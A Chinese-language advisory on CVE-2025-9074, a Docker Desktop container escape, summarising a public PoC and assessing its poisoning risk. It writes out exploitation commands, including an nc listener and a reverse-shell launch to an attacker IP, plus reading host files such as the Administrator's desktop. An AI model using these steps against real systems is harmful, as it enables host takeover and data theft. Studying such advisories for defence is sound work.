## CVE-2025-9074 - Docker Desktop 容器逃逸 (Container Escape)

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器逃逸 (Container Escape)

**影响应用:** Docker Desktop

**危害等级:** 关键 (Critical)

**CVSS评分:** 9.3

**影响版本:** Docker Desktop < 4.44.3

**利用条件:** 无需认证 (Unauthenticated access), 需要容器访问 (Requires container access)

**POC 可用性:** 9

**POC 类型:** 完整利用 (Full Exploit)

**攻击复杂度:** 低 (Low)

**投毒风险:** 10%

## 详情

CVE-2025-9074 是 Docker Desktop 中发现的一个极为关键的容器逃逸漏洞，其 CVSS 评分为 9.3，被标记为“临界”（Critical）级别。该漏洞的核心在于，它允许在 Docker Desktop 环境下运行的任何容器，在无需任何认证的情况下，非法访问宿主机上的 Docker Engine API。这一严重缺陷在设计上规避了所有既定的安全防护措施，包括“增强容器隔离”（Enhanced Container Isolation, ECI）设置以及“Expose daemon on tcp://localhost:2375 without TLS”等配置，使得这些安全屏障形同虚设。漏洞的根本原因在于 Docker Engine API 被错误地暴露在一个可从容器网络内部直接访问的 TCP socket (具体地址为 "http://192.168.65.7:2375") 上。

该漏洞的影响范围极其广泛且破坏力巨大。对于采用 Windows Subsystem for Linux (WSL) 后端的 Windows 宿主机，攻击者一旦成功利用，便能够实现对整个宿主机的完全接管，并获得等同于管理员账户的最高权限。而在 macOS 操作系统上，虽然利用过程中可能受到用户提示的限制，攻击者仍能实现对容器的任意操纵，甚至可能植入后门程序，从而间接控制宿主机资源。值得庆幸的是，基于原生 Linux 的 Docker 环境不受此漏洞影响，因为它们默认通过 Unix socket 而非 TCP socket 与 Docker Engine 通信。

随附的 POC 代码 (`exploit.py`) 提供了一个功能完备、操作简便的利用工具，其设计目的在于清晰地演示并实际执行该容器逃逸漏洞。该 Python 脚本利用了前述的未授权 Docker Engine API 访问能力，通过精心构造的 API 请求，能够创建并启动具有特权的新容器。这些特权容器被赋予了挂载宿主机整个文件系统的能力，这意味着攻击者可以不受限制地读取、修改甚至在宿主机上执行任意文件。这彻底绕过了 Docker 的所有沙箱和隔离机制，实现了从容器到宿主机的全面控制。POC 支持两种核心的利用模式：**命令执行模式**和**反向 Shell 模式**。

在**命令执行模式**下，攻击者可以利用新建的特权容器作为跳板，直接在宿主机环境中执行任意操作系统命令。例如，通过简单的命令行参数，可以执行 `whoami` 来识别当前用户身份，或者执行 `cat /hostfs/mnt/c/Users/Administrator/Desktop/root.txt` 来读取 Windows 宿主机上的敏感文件（`/hostfs` 路径映射了宿主机根目录），甚至是 `ls -la /hostfs/mnt/c/Users` 来列举宿主机用户目录，从而直接窃取敏感数据或进行侦察。**反向 Shell 模式**则更为强大，它允许攻击者在宿主机上建立一个与攻击者控制的监听器连接的反向 Shell 会话。一旦连接成功，攻击者便获得了一个交互式的命令行接口，能够远程、实时地对宿主机进行操作和控制。

POC 的 `README.md` 文件提供了极为详尽的利用步骤、命令示例以及直观的截图，这些都极大地降低了利用门槛，并证实了其高度的可用性和有效性。该漏洞由 Felix Boulet 和 Philippe Dugré 在 2025 年中期发现，并于 2025 年 8 月 20 日通过发布 Docker Desktop 4.44.3+ 版本进行了修复。因此，任何低于此版本的 Docker Desktop 安装都面临着即时的、极高的安全风险。该 POC 的有效性体现在其直接利用了 Docker Engine API 的核心功能，且攻击过程中无需任何认证，使得具备基础网络知识的攻击者能够在极短时间内从一个被控制的容器中完全控制宿主机。利用步骤如下：
1.  **安装依赖**: 在攻击者机器上执行 `pip3 install requests`。
2.  **命令执行模式**: 运行 `python3 exploit.py -u http://192.168.65.7:2375 -m cmd -c "your_command_here"`。例如，`python3 exploit.py -u http://192.168.65.7:2375 -m cmd -c "whoami"`。
3.  **反向 Shell 模式**: 
    a. 在攻击者机器终端 1 设置监听器：`nc -lvnp 4444`。
    b. 在终端 2 执行 POC：`python3 exploit.py -u http://192.168.65.7:2375 -m reverse -l <YOUR_IP> -p 4444`。
4.  **容器内验证**: 如果已获得容器访问权限，可直接用 `curl http://192.168.65.7:2375/version` 验证 API 可达性。

针对 CVE-2025-9074 的 PoC 代码进行深入的投毒风险评估，评估结果显示其投毒风险为低，具体评定为 10%。这一评估是基于对 PoC 功能描述、代码结构和行为模式的综合分析。从提供的 `README.md` 文件中可以看出，该 PoC 的核心目标是明确且单一的：演示并实际利用 Docker Desktop 中的容器逃逸漏洞。其所有描述和操作流程都围绕着通过未授权访问 Docker Engine API 来实现宿主机控制这一目的。

以下是支撑其低投毒风险评级的关键因素：
1.  **目的透明且单一**: PoC 的文档清楚地阐明了其作为漏洞验证工具的身份。它没有提及任何超出漏洞利用范围的额外功能，例如收集用户数据、建立后门或进行其他恶意活动。其行为完全与其声明的“容器逃逸 PoC”角色相符。
2.  **依赖标准且公开的库**: PoC 主要依赖 Python 的 `requests` 库进行 HTTP 通信。`requests` 是一个在 Python 社区中广泛使用、经过严格审查且高度信任的库。使用此类标准、开源且维护良好的库，显著降低了通过引入恶意依赖进行投毒的风险。PoC 的描述中没有提及使用任何异常、模糊或不开源的第三方库。
3.  **代码行为可预测和可审计**: 虽然没有直接提供 `exploit.py` 的源代码，但 `README.md` 中详细的命令示例和攻击场景图清晰地勾勒出 PoC 的行为逻辑。它通过构造 HTTP 请求与 `192.168.65.7:2375` 上的 Docker Engine API 进行交互，以创建特权容器或执行命令。这些行为是漏洞利用的直接体现，而非隐蔽的恶意操作。对于安全研究人员而言，其行为是可预测和可审计的。
4.  **无明显混淆或隐藏特性**: `README.md` 没有暗示 PoC 代码存在任何形式的代码混淆或加密，也没有提及需要下载外部未经验证的脚本或二进制文件。通常，恶意软件或被投毒的 PoC 会采用这些技术来隐藏其真实意图。
5.  **无回连或C2通信**: 除了用户明确指定用于反向 Shell 的监听地址和端口（这属于预期的漏洞利用结果）之外，PoC 的描述中没有提及任何 PoC 自身尝试连接到攻击者控制的命令与控制（C2）服务器，或者泄露执行 PoC 机器信息的行为。所有的网络通信都是针对目标 Docker Engine API 或用户指定的回连地址。

总结来说，该 PoC 被设计为一个直接、高效且透明的漏洞利用工具。它的风险主要在于其利用目标系统（即 Docker Desktop 宿主机）的后果，而非 PoC 代码本身对运行该 PoC 的机器造成意料之外的二次感染或投毒。因此，在理解其利用机制和潜在影响的前提下，将其作为防御性安全研究工具使用，其代码层面的投毒风险被评估为低。

**项目地址:** https://github.com/vulnwatchdog/CVE-2025-9074-Docker-Desktop-Container-Escape-PoC

**漏洞详情:** 
